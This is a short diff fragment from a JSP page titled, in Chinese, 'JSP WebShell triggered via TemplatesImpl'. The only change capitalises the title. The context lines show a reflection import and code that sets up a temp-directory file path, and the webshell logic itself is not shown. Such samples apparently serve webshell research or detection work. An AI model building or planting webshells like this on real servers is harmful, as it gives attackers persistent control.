@@ -11,7 +11,7 @@
 <%@ page import="sun.reflect.misc.FieldUtil" %>
 <html>
 <body>
-<h2>利用TemplatesImpl触发的JSP Webshell</h2>
+<h2>利用TemplatesImpl触发的JSP WebShell</h2>
 <%
     String tmp = System.getProperty("java.io.tmpdir");
     String inputFile = tmp + File.separator + "jabdhjabdjkandaldlanaklndkand.txt";
